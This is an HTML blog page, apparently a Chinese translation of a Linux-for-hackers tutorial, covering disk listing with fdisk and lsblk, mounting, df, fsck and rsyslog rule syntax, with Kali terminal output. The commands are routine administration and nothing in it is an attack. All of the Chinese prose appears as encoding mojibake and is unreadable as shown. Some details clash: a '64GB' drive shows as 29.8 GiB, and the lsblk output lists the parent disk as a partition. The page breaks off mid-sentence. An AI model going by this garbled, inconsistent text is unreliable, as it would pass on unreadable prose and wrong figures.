class="line">Â­Â­snip--</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¸¦æœ‰ fdisk çš„-l å‚æ•°åˆ—å‡ºæ‰€æœ‰é©±åŠ¨å™¨çš„æ‰€æœ‰åˆ†åŒºï¼Œ</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fdisk  -l </span><br><span class="line">Disk /dev/sda: 20GiB,<span class="number"> 21474836480 </span>bytes,<span class="number"> 41943040 </span>sectors  </span><br><span class="line">108 </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes </span><br><span class="line">  </span><br><span class="line">Disk label type: dos </span><br><span class="line">Disk identifier: 0x7c06cd70 </span><br><span class="line"> </span><br><span class="line">Device Boot Start End   Sectors Size Id Type </span><br><span class="line">/dev/sda1 *<span class="number"> 2048 </span>39174143<span class="number"> 39172096 </span>18.7G<span class="number"> 83 </span>Linux </span><br><span class="line">/dev/sda2<span class="number"> 39176190 </span><span class="number"> 41940991 </span> <span class="number"> 2764802 </span>1.3G<span class="number"> 5 </span>Extended </span><br><span class="line">/dev/sda5<span class="number"> 39176192 </span><span class="number"> 41940991 </span> <span class="number"> 2764800 </span>1.3G<span class="number"> 82 </span>Linux swap / Solaris </span><br><span class="line"> </span><br><span class="line">Disk /dev/sdb: 29.8 GiB,<span class="number"> 31999393792 </span>bytes,<span class="number"> 62498816 </span>sectors </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes Disk label type: dos </span><br><span class="line">Disk identifier: 0xc3072e18 </span><br><span class="line"> </span><br><span class="line">Device Boot  Start End Sectors Size Id Type </span><br><span class="line">/dev/sdb1<span class="number"> 32 </span>62498815<span class="number"> 62498784 </span>29.8G<span class="number"> 7 </span>HPFS/NTFS/exFAT</span><br></pre></td></tr></table></figure><p>è®¾å¤‡ sda1ã€sda2 å’Œ sda5 åœ¨ç¬¬ä¸€èŠ‚ä¸­åˆ—å‡ºã€‚è¿™ä¸‰ç§è®¾å¤‡æ„æˆäº†æˆ‘çš„è™šæ‹Ÿæœºçš„è™šæ‹Ÿç£ ç›˜ï¼Œå®ƒæ˜¯ä¸€ä¸ª 20GB çš„é©±åŠ¨å™¨ï¼Œæœ‰ä¸‰ä¸ªåˆ†åŒºï¼ŒåŒ…æ‹¬äº¤æ¢åˆ†åŒº(sda5)ï¼Œå½“ RAM å®¹é‡è¶…è¿‡æ—¶ï¼Œå®ƒå……å½“è™šæ‹Ÿ RAM â€”ç±»ä¼¼äº Windows ä¸­çš„è™šæ‹Ÿé¡µé¢æ–‡ä»¶ã€‚<br>å‘ä¸‹æ‰«æåˆ°ç¬¬ä¸‰èŠ‚ï¼Œæ‚¨å°†çœ‹åˆ°æŒ‡å®šä¸º sdb -çš„ç¬¬äºŒä¸ªè®¾å¤‡è¾“å‡ºï¼Œb æ ‡ç­¾å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªé©± åŠ¨å™¨ä¸å‰ä¸‰ä¸ªè®¾å¤‡æ˜¯åˆ†å¼€çš„ã€‚è¿™æ˜¯æˆ‘çš„ 64GB é—ªå­˜ã€‚æ³¨æ„ï¼Œfdisk è¡¨ç¤ºå®ƒæ˜¯ HPFS/NTFS/ExFAT æ–‡ä»¶ç³»ç»Ÿç±»å‹ã€‚ è¿™äº›æ–‡ä»¶ç±»å‹â€”â€”é«˜æ€§èƒ½æ–‡ä»¶ç³»ç»Ÿ(HPFS)ã€æ–°æŠ€æœ¯æ–‡ä»¶ç³»ç»Ÿ(NTFS)å’Œæ‰©å±•æ–‡ä»¶åˆ†é…è¡¨(exFAT)â€”â€”ä¸æ˜¯ Linux ç³»ç»Ÿçš„æœ¬æœºæ–‡ä»¶ï¼Œè€Œæ˜¯ macOS å’Œ Windows ç³»ç»Ÿçš„ã€‚åœ¨è¿›è¡Œç ”ç©¶æ—¶ï¼Œèƒ½å¤Ÿè¯†åˆ«ä¸åŒç³»ç»Ÿçš„åŸç”Ÿæ–‡ä»¶ç±»å‹æ˜¯å€¼ å¾—çš„ã€‚æ–‡ä»¶ç³»ç»Ÿå¯èƒ½æŒ‡å‡ºé©±åŠ¨å™¨çš„æ ¼å¼è®¾ç½®åœ¨å“ªç§æœºå™¨ä¸Šï¼Œè¿™æ˜¯æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚Kali èƒ½å¤Ÿä½¿ç”¨åœ¨è®¸å¤šä¸åŒæ“ ä½œç³»ç»Ÿä¸Šåˆ›å»ºçš„ USB é—ªå­˜é©±åŠ¨å™¨ã€‚<br>æ­£å¦‚æ‚¨åœ¨ç¬¬ 1 ç« ä¸­çœ‹åˆ°çš„ï¼ŒLinux æ–‡ä»¶ç³»ç»Ÿçš„ç»“æ„ä¸ Windows å’Œå…¶ä»–ä¸“æœ‰æ“ä½œç³»ç»Ÿæœ‰å¾ˆå¤§çš„ä¸åŒã€‚æœ€é‡ è¦çš„æ˜¯ï¼ŒLinux ä¸­æ–‡ä»¶çš„å­˜å‚¨å’Œç®¡ç†æ–¹å¼ä¹Ÿä¸åŒã€‚æ–°ç‰ˆæœ¬çš„ Windows ä½¿ç”¨ NTFS æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ—§çš„ Windows<br>109<br>ç³»ç»Ÿä½¿ç”¨æ–‡ä»¶åˆ†é…è¡¨(FAT)ç³»ç»Ÿã€‚<br>Linux ä½¿ç”¨è®¸å¤šä¸åŒç±»å‹çš„æ–‡ä»¶ç³»ç»Ÿï¼Œä½†æœ€å¸¸è§çš„æ˜¯ ext2ã€ext3 å’Œ ext4ã€‚è¿™äº›éƒ½æ˜¯ ext(æˆ–æ‰©å±•çš„)æ–‡ä»¶ç³» ç»Ÿçš„å‡çº§ç‰ˆï¼Œext4 æ˜¯æœ€æ–°çš„ã€‚ </p><h3 id="å­—ç¬¦å’Œå—è®¾å¤‡"><a href="#å­—ç¬¦å’Œå—è®¾å¤‡" class="headerlink" title="å­—ç¬¦å’Œå—è®¾å¤‡"></a>å­—ç¬¦å’Œå—è®¾å¤‡</h3><p>å…³äº/dev ç›®å½•ä¸­è®¾å¤‡æ–‡ä»¶çš„å‘½åï¼Œè¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¬¬ä¸€ä¸ªä½ç½®åŒ…å« c æˆ– bã€‚æ‚¨å¯ä»¥åœ¨æ¸…å• 10-1 çš„å¤§ å¤šæ•°æ¡ç›®å¼€å¤´çœ‹åˆ°è¿™ä¸€ç‚¹ï¼Œå®ƒçœ‹èµ·æ¥åƒè¿™æ ·: </p><p>è¿™äº›å­—æ¯ä»£è¡¨è®¾å¤‡è¾“å…¥å’Œè¾“å‡ºæ•°æ®çš„ä¸¤ç§æ–¹å¼ã€‚c ä»£è¡¨å­—ç¬¦ï¼Œå¦‚æ‚¨æ‰€æ–™ï¼Œè¿™äº›è®¾å¤‡è¢«ç§°ä¸ºå­—ç¬¦è®¾å¤‡ã€‚é€š è¿‡é€ä¸ªå­—ç¬¦(å¦‚é¼ æ ‡æˆ–é”®ç›˜)å‘é€å’Œæ¥æ”¶æ•°æ®ä¸ç³»ç»Ÿäº¤äº’çš„å¤–éƒ¨è®¾å¤‡æ˜¯å­—ç¬¦è®¾å¤‡ã€‚ </p><p>b ä»£è¡¨ç¬¬äºŒç§ç±»å‹:å—è®¾å¤‡ã€‚å®ƒä»¬ä»¥æ•°æ®å—(ä¸€æ¬¡å¤šä¸ªå­—èŠ‚)è¿›è¡Œé€šä¿¡ï¼ŒåŒ…æ‹¬ç¡¬ç›˜é©±åŠ¨å™¨å’Œ DVD é©±åŠ¨å™¨ç­‰ è®¾å¤‡ã€‚è¿™äº›è®¾å¤‡éœ€è¦æ›´é«˜çš„æ•°æ®ååé‡ï¼Œå› æ­¤ä»¥å—(ä¸€æ¬¡å¤šä¸ªå­—ç¬¦æˆ–å­—èŠ‚)çš„å½¢å¼å‘é€å’Œæ¥æ”¶æ•°æ®ã€‚ä¸€æ—¦æ‚¨çŸ¥ é“ä¸€ä¸ªè®¾å¤‡æ˜¯å­—ç¬¦è®¾å¤‡è¿˜æ˜¯å—è®¾å¤‡ï¼Œæ‚¨å°±å¯ä»¥è½»æ¾åœ°è·å¾—å…³äºå®ƒçš„æ›´å¤šä¿¡æ¯ã€‚</p><h3 id="ä½¿ç”¨-lsblkåˆ—å‡º-å—è®¾å¤‡å’Œä¿¡æ¯"><a href="#ä½¿ç”¨-lsblkåˆ—å‡º-å—è®¾å¤‡å’Œä¿¡æ¯" class="headerlink" title="ä½¿ç”¨ lsblkåˆ—å‡º å—è®¾å¤‡å’Œä¿¡æ¯"></a>ä½¿ç”¨ lsblkåˆ—å‡º å—è®¾å¤‡å’Œä¿¡æ¯</h3><p>Linux å‘½ä»¤ lsblk (list block çš„ç¼©å†™)åˆ—å‡º/dev ä¸­åˆ—å‡ºçš„æ¯ä¸ªå—è®¾å¤‡çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚ç»“æœç±»ä¼¼äº fdisk -l çš„è¾“å‡ºï¼Œä½†å®ƒä¹Ÿå°†åœ¨ä¸€ç§æ ‘å‹ç»“æ„ä¸­æ˜¾ç¤ºå…·æœ‰å¤šä¸ªåˆ†åŒºçš„è®¾å¤‡ï¼Œå°†æ¯ä¸ªè®¾å¤‡çš„åˆ†åŒºæ˜¾ç¤ºä¸ºåˆ†æ”¯ï¼Œå¹¶ä¸”ä¸éœ€ è¦è¿è¡Œæ ¹ç‰¹æƒã€‚ä¾‹å¦‚ï¼Œåœ¨æ¸…å• 10-3 ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº† sda åŠå…¶åˆ†æ”¯ sda1ã€sda2 å’Œ sda5ã€‚ </p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;lsblk </span><br><span class="line">Name MAJ:MIN RM SIZE RO TYPE MOUNTPOINT </span><br><span class="line">fd0 2:0<span class="number"> 1 </span>4K<span class="number"> 0 </span>disk </span><br><span class="line">sda1 8:0<span class="number"> 0 </span>20G<span class="number"> 0 </span>disk </span><br><span class="line">|-sda1 8:1<span class="number"> 0 </span>18.7G<span class="number"> 0 </span>part / </span><br><span class="line">|-sda2 8:2<span class="number"> 0 </span>1K<span class="number"> 0 </span>part </span><br><span class="line">|-sda5 8:5<span class="number"> 0 </span>1.3G<span class="number"> 0 </span>part [SWAP] </span><br><span class="line"></span><br><span class="line">sdb 8:16<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk </span><br><span class="line">|-sdb1 8.17<span class="number"> 1 </span>29.8G<span class="number"> 0 </span>disk /media </span><br><span class="line">sr0 11:0<span class="number"> 1 </span>2.7G<span class="number"> 0 </span>rom</span><br></pre></td></tr></table></figure><p>è¾“å‡ºåŒ…æ‹¬è½¯ç›˜é©±åŠ¨å™¨ä½œä¸º fd0, DVD é©±åŠ¨å™¨ä½œä¸º sr0ï¼Œå°½ç®¡æˆ‘çš„ç³»ç»Ÿä¸Šæ²¡æœ‰è½¯ç›˜é©±åŠ¨å™¨ï¼Œè¿™åªæ˜¯æ—§ç³»ç»Ÿçš„ é—ç•™ã€‚æˆ‘ä»¬è¿˜å¯ä»¥åœ¨é©±åŠ¨å™¨çš„æŒ‚è½½ç‚¹ä¸Šçœ‹åˆ°ä¿¡æ¯â€”â€”è¿™æ˜¯é©±åŠ¨å™¨é™„åŠ åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ä½ç½®ã€‚è¯·æ³¨æ„ï¼Œç¡¬ç›˜é©± åŠ¨å™¨ sda1 å®‰è£…åœ¨/ç›®å½•å’Œé—ªå­˜é©±åŠ¨å™¨å®‰è£…åœ¨/media ç›®å½•ã€‚</p><h3 id="è‡ªå·±å®‰è£…å­˜å‚¨è®¾å¤‡"><a href="#è‡ªå·±å®‰è£…å­˜å‚¨è®¾å¤‡" class="headerlink" title="è‡ªå·±å®‰è£…å­˜å‚¨è®¾å¤‡"></a>è‡ªå·±å®‰è£…å­˜å‚¨è®¾å¤‡</h3><p>mount  /dev/sdb1  /mnt         å°†æ–°ç¡¬ç›˜ sdb1 æŒ‚è½½åˆ°/mnt ç›®å½•</p><h3 id="å¸è½½ä¸-umount"><a href="#å¸è½½ä¸-umount" class="headerlink" title="å¸è½½ä¸ umount"></a>å¸è½½ä¸ umount</h3><p>umount  /dev/sdb1 </p><h3 id="è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯"><a href="#è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯" class="headerlink" title="è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯"></a>è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯</h3><p>å‘½ä»¤ df(å¯¹äºç©ºä½™ç£ç›˜)å°†ä¸ºæˆ‘ä»¬æä¾›å…³äºä»»ä½•ç¡¬ç›˜æˆ–æŒ‚è½½è®¾å¤‡(å¦‚ CDã€DVD å’Œé—ªå­˜é©±åŠ¨å™¨)çš„åŸºæœ¬ä¿¡æ¯ï¼Œ åŒ…æ‹¬æ­£åœ¨ä½¿ç”¨çš„ç©ºé—´å’Œå¯ç”¨ç©ºé—´(å‚è§æ¸…å• 10-4)ã€‚å¦‚æœæ²¡æœ‰ä»»ä½•é€‰é¡¹ï¼Œdf é»˜è®¤ä¸ºç³»ç»Ÿä¸Šçš„ç¬¬ä¸€ä¸ªé©±åŠ¨å™¨(åœ¨ æœ¬ä¾‹ä¸­æ˜¯ sda)ã€‚å¦‚æœæ‚¨æƒ³æ£€æŸ¥å¦ä¸€ä¸ªé©±åŠ¨å™¨ï¼Œåªéœ€ä½¿ç”¨æ‚¨æƒ³æ£€æŸ¥çš„é©±åŠ¨å™¨è¡¨ç¤ºå½¢å¼(ä¾‹å¦‚ï¼Œdf sdb)éµå¾ª df å‘½ ä»¤å³å¯ã€‚ </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;df  </span><br><span class="line">Filesystem <span class="number">1</span>K-Blocks Used Available Use% Mounted on </span><br><span class="line">rootfs <span class="number">19620732</span>    <span class="number">17096196</span> <span class="number">1504788</span> <span class="number">92</span>% / </span><br><span class="line">udev  <span class="number">10240</span> <span class="number">0</span> <span class="number">10240</span>   <span class="number">0</span>% /dev  </span><br><span class="line">Â­Â­snip--   </span><br><span class="line"> </span><br><span class="line">/dev/sdb1 <span class="number">29823024</span>  <span class="number">29712544</span> <span class="number">110480</span>  <span class="number">99</span>% /media/USB3<span class="number">.0</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç¬¬ä¸€è¡Œè¾“å‡ºæˆ‘ä»¬å¾—åˆ°çš„ä¿¡æ¯æ˜¾ç¤ºç±»åˆ«æ ‡é¢˜ï¼Œç£ç›˜ç©ºé—´ä»¥ 1KB å—çš„å½¢å¼ç»™å‡ºã€‚åœ¨ç¬¬äºŒè¡Œï¼Œæˆ‘ä»¬çœ‹ åˆ° rootfs æœ‰ 19,620,732 ä¸ª 1 åƒå­—èŠ‚çš„å—ï¼Œå…¶ä¸­ä½¿ç”¨äº† 17,096,196 ä¸ªå—(çº¦å  92%)ï¼Œå‰©ä¸‹ 1,504,788 ä¸ªå¯ç”¨ã€‚ df å‘½ä»¤è¿˜å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿå®‰è£…åœ¨æ–‡ä»¶ç³»ç»Ÿ/æ ¹ç›®å½•ã€‚<br>åœ¨æœ€åä¸€è¡Œï¼Œä½ å¯ä»¥çœ‹åˆ°æˆ‘çš„ u ç›˜ã€‚æ³¨æ„ï¼Œå®ƒè¢«æŒ‡å®šä¸º/dev/sdb1ï¼Œå‡ ä¹ 100%å·²æ»¡ï¼ŒæŒ‚è½½åœ¨/media/USB3.0ã€‚<br>ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘åœ¨è¿™ä¸ªç³»ç»Ÿä¸Šçš„è™šæ‹Ÿç£ç›˜è¢«æŒ‡å®šä¸º sda1ï¼Œå®ƒçš„ä¿¡æ¯å¦‚ä¸‹:<br>sd SATA ç¡¬ç›˜<br>ä¸€ä¸ªç¡¬ç›˜é©±åŠ¨å™¨<br>é©±åŠ¨å™¨ä¸Šçš„ç¬¬ä¸€ä¸ªåˆ†åŒº </p><p>æˆ‘çš„ 64GB é—ªå­˜é©±åŠ¨å™¨æŒ‡å®šä¸º sdb1ï¼Œæˆ‘çš„å¤–éƒ¨é©±åŠ¨å™¨æŒ‡å®šä¸º sdc1</p><h3 id="æ£€æŸ¥é”™è¯¯"><a href="#æ£€æŸ¥é”™è¯¯" class="headerlink" title="æ£€æŸ¥é”™è¯¯"></a>æ£€æŸ¥é”™è¯¯</h3><p>fsck å‘½ä»¤(æ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥çš„ç¼©å†™)æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿçš„é”™è¯¯å¹¶ä¿®å¤æŸå(å¦‚æœå¯èƒ½çš„è¯)ï¼Œæˆ–è€…å°†é”™è¯¯åŒºåŸŸæ”¾å…¥ ä¸€ä¸ªé”™è¯¯å—è¡¨ä¸­ï¼Œå°†å…¶æ ‡è®°ä¸ºé”™è¯¯ã€‚è¦è¿è¡Œ fsck å‘½ä»¤ï¼Œéœ€è¦æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿç±»å‹(é»˜è®¤ä¸º ext2)å’Œè¦æ£€æŸ¥çš„è®¾ å¤‡æ–‡ä»¶ã€‚é‡è¦çš„æ˜¯ï¼Œåœ¨è¿è¡Œæ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥ä¹‹å‰ï¼Œå¿…é¡»å¸è½½é©±åŠ¨å™¨ã€‚</p><p>å› æ­¤ï¼Œæ‰§è¡Œæ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥çš„ç¬¬ä¸€æ­¥æ˜¯å¸è½½è®¾å¤‡ã€‚</p><p>kali &gt;umount  /dev/sdb1 </p><p>æˆ‘å¯ä»¥æ·»åŠ -p é€‰é¡¹ï¼Œè®© fsck è‡ªåŠ¨ä¿®å¤</p><p>kali &gt;fsck  -p  /dev/sdb1 </p><p>åœ¨è®¾å¤‡å¸è½½åï¼Œæˆ‘ç°åœ¨å¯ä»¥æ£€æŸ¥è®¾å¤‡çš„ä»»ä½•åæ‰‡åŒºæˆ–å…¶ä»–é—®é¢˜ï¼Œå¦‚ä¸‹: </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fsck  -p  /dev/sdb1  </span><br><span class="line">fsck <span class="keyword">from</span> util-linux 2.30.2  </span><br><span class="line">exfatfsck 1.2.7 </span><br><span class="line">Checking file<span class="built_in"> system </span>on /dev/sdb1.  </span><br><span class="line">File<span class="built_in"> system </span>version 1.0 </span><br><span class="line">Sector size 512 bytes </span><br><span class="line">Cluster size 32 KB </span><br><span class="line">Volume size 7648 MB </span><br><span class="line">Used space 1265 MB </span><br><span class="line">Available space 6383 MB  </span><br><span class="line">Totally 20 directories <span class="keyword">and</span> 111 files. </span><br><span class="line">File<span class="built_in"> system </span>checking finished. <span class="literal">No</span> errors found.</span><br></pre></td></tr></table></figure><h2 id="æ—¥å¿—ç³»ç»Ÿ"><a href="#æ—¥å¿—ç³»ç»Ÿ" class="headerlink" title="æ—¥å¿—ç³»ç»Ÿ"></a>æ—¥å¿—ç³»ç»Ÿ</h2><p>Linux ä½¿ç”¨ä¸€ä¸ªåä¸º syslogd çš„å®ˆæŠ¤è¿›ç¨‹æ¥è‡ªåŠ¨è®°å½•è®¡ç®—æœºä¸Šçš„äº‹ä»¶ã€‚syslog çš„å‡ ä¸ªå˜ä½“ï¼ŒåŒ…æ‹¬ rsyslog å’Œ syslog-ng</p><h3 id="rsyslogæ—¥å¿—è®°å½•è§„åˆ™"><a href="#rsyslogæ—¥å¿—è®°å½•è§„åˆ™" class="headerlink" title="rsyslogæ—¥å¿—è®°å½•è§„åˆ™"></a>rsyslogæ—¥å¿—è®°å½•è§„åˆ™</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">###############  </span><br><span class="line">#### RULES ####  </span><br><span class="line">###############  </span><br><span class="line"># </span><br><span class="line"><span class="number">117</span> </span><br><span class="line"># First some standard log files. Log by facility.  </span><br><span class="line"># </span><br><span class="line">auth,authpriv.* /var/log/auth.log </span><br><span class="line">*.*Í¾auth,authpriv.none -/var/log/syslog  </span><br><span class="line">#cron.* /var/log/cron.log </span><br><span class="line">daemon.*  -/var/log/daemon.log  </span><br><span class="line">kern.* -/var/log/kern.log </span><br><span class="line"><span class="number">1</span>pr.* -/var/log/lpr.log </span><br><span class="line">mail.* -/var/log/mail.log </span><br><span class="line">user.* -/var/log/user.log </span><br><span class="line"> </span><br><span class="line"># </span><br><span class="line"># Logging for the mail <span class="keyword">system</span>. Split it up so that  </span><br><span class="line"># it is easy to write scripts to parse these files. </span><br><span class="line"># </span><br><span class="line">mail.info -/var/log/mail.info </span><br><span class="line">mail.warn -/var/log/mail.warn </span><br><span class="line">mail.err /var/log/mail.err</span><br></pre></td></tr></table></figure><p>æ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„æ—¥å¿—è®°å½•è§„åˆ™ï¼Œè¯´æ˜è®°å½•äº†å“ªäº›æ¶ˆæ¯ä»¥åŠè®°å½•åˆ°å“ªé‡Œã€‚è¿™äº›è§„åˆ™çš„åŸºæœ¬æ ¼å¼å¦‚<br>ä¸‹: </p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">facility.<span class="built_in">priority</span> <span class="built_in">action</span></span><br></pre></td></tr></table></figure><p> facility å…³é”®å­—å¼•ç”¨æ­£åœ¨è®°å½•å…¶æ¶ˆæ¯çš„ç¨‹åºï¼Œä¾‹å¦‚é‚®ä»¶ã€å†…æ ¸æˆ–æ‰“å°ç³»ç»Ÿã€‚priority å…³é”®å­—å†³å®šä¸ºè¯¥ç¨‹åº è®°å½•å“ªç§ç±»å‹çš„æ¶ˆæ¯ã€‚åœ¨æœ€å³è¾¹çš„ action å…³é”®å­—å¼•ç”¨å°†å‘é€æ—¥å¿—çš„ä½ç½®ã€‚è®©æˆ‘ä»¬æ›´ä»”ç»†åœ°çœ‹ä¸€ä¸‹æ¯ä¸ªéƒ¨åˆ†ï¼Œ é¦–å…ˆæ˜¯ facility å…³é”®å­—ï¼Œå®ƒæŒ‡çš„æ˜¯ç”Ÿæˆæ—¥å¿—çš„ä»»ä½•è½¯ä»¶ï¼Œæ— è®ºæ˜¯å†…æ ¸ã€é‚®ä»¶ç³»ç»Ÿè¿˜æ˜¯ç”¨æˆ·ã€‚ </p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ä»£ç åˆ—è¡¨ï¼Œå¯ä»¥ç”¨æ¥ä»£æ›¿æˆ‘ä»¬çš„é…ç½®æ–‡ä»¶è§„åˆ™ä¸­çš„å…³é”®å­— facility:<br>auth/authpriv å®‰å…¨/æˆæƒæ¶ˆæ¯<br>cron æ—¶é’Ÿå®ˆæŠ¤è¿›ç¨‹<br>daemon å…¶ä»–å®ˆæŠ¤è¿›ç¨‹<br>kern å†…æ ¸æ¶ˆæ¯<br>118<br>lpr æ‰“å°ç³»ç»Ÿ<br>mail é‚®ä»¶ç³»ç»Ÿ<br>user å¸¸è§„ç”¨æˆ·çº§åˆ«æ¶ˆæ¯ </p><p>æ˜Ÿå·é€šé…ç¬¦ï¼ˆ*ï¼‰ä»£æ›¿å•è¯æŒ‡çš„æ˜¯æ‰€æœ‰ä¿¡æ¯ã€‚ æ‚¨å¯ä»¥é€šè¿‡ä»¥é€—å·åˆ†éš”çš„åˆ—è¡¨æ¥é€‰æ‹©å¤šä¸ªã€‚<br>ä¼˜å…ˆçº§å‘Šè¯‰ç³»ç»Ÿè¦è®°å½•å“ªç§æ¶ˆæ¯ã€‚ä»£ç ä»æœ€ä½ä¼˜å…ˆçº§åˆ—å‡ºï¼Œä»è°ƒè¯•å¼€å§‹åˆ°æœ€é«˜ä¼˜å…ˆçº§ï¼Œä»¥ä¸¥é‡ç»“æŸã€‚ å¦‚æœä¼˜å…ˆçº§ä¸º*ï¼Œåˆ™è®°å½•æ‰€æœ‰ä¼˜å…ˆçº§çš„æ¶ˆæ¯ã€‚æŒ‡å®šä¼˜å…ˆçº§æ—¶ï¼Œå°†è®°å½•è¯¥ä¼˜å…ˆçº§åŠæ›´é«˜ä¼˜å…ˆçº§çš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ï¼Œ å¦‚æœæŒ‡å®šçš„ä¼˜å…ˆçº§ä»£ç ä¸ºå‘Šè­¦ alertï¼Œç³»ç»Ÿå°†è®°å½•åˆ†ç±»ä¸ºå‘Šè­¦å’Œæ›´é«˜ä¼˜å…ˆçº§çš„æ¶ˆæ¯ï¼Œä½†ä¸ä¼šè®°å½•æ ‡è®°ä¸º crit çš„æ¶ˆæ¯æˆ–ä½äºè­¦æŠ¥çš„ä»»ä½•ä¼˜å…ˆçº§ã€‚ä»¥ä¸‹æ˜¯æœ‰æ•ˆä¼˜å…ˆçº§ä»£ç çš„å®Œæ•´åˆ—è¡¨ï¼š </p><p>â€¢ debug </p><p>â€¢ info </p><p>â€¢ notice</p><p>â€¢ warning </p><p>â€¢ warn </p><p>â€¢ error </p><p>â€¢ err </p><p>â€¢ crit </p><p>â€¢ alert </p><p>â€¢ emerg </p><p>â€¢ panic<br>warningã€warnã€errorã€errã€emergã€panicï¼Œè¿™äº›éƒ½å·²è¢«å¼ƒç”¨ï¼Œä¸åº”è¯¥ä½¿ç”¨ã€‚ </p><p>æ“ä½œé€šå¸¸æ˜¯ä¸€ä¸ªæ–‡ä»¶åå’Œåº”è¯¥å‘é€æ—¥å¿—çš„ä½ç½®ã€‚æ³¨æ„ï¼Œé€šå¸¸ï¼Œæ—¥å¿—æ–‡ä»¶è¢«å‘é€åˆ°/var/log ç›®å½•ï¼Œå…¶æ–‡ä»¶ åæè¿°ä¸ºç”Ÿæˆå®ƒä»¬çš„å·¥å…·ï¼Œå¦‚ authã€‚è¿™æ„å‘³ç€ï¼Œä¾‹å¦‚ï¼Œç”± auth å·¥å…·ç”Ÿæˆçš„æ—¥å¿—å°†è¢«å‘é€åˆ°/var/log.auth.logã€‚<br>è®©æˆ‘ä»¬çœ‹ä¸€äº›æ—¥å¿—è§„åˆ™çš„ä¾‹å­: </p><p>mail.* /var/log/mail<br>è¿™ä¸ªç¤ºä¾‹å°†æ‰€æœ‰(*)ä¼˜å…ˆçº§çš„é‚®ä»¶äº‹ä»¶è®°å½•åˆ°/var/log/mail æ–‡ä»¶ä¸­ã€‚ </p><p>kern.crit /var/log/kernel<br>è¿™ä¸ªä¾‹å­å°†æŠŠå±é™©(crit)ä¼˜å…ˆçº§æˆ–æ›´é«˜çš„å†…æ ¸äº‹ä»¶è®°å½•åˆ°/var/log/kernel ä¸­ã€‚ </p><p>*.emerg *<br>æœ€åä¸€ä¸ªç¤ºä¾‹å°†è®°å½•æ‰€æœ‰ç™»å½•ç”¨æˆ·çš„ç´§æ€¥äº‹ä»¶(emerg)ä¼˜å…ˆçº§çš„æ‰€æœ‰äº‹ä»¶ã€‚</p><p>é€šè¿‡è¿™äº›è§„åˆ™ï¼Œé»‘å®¢å¯ä»¥ç¡® 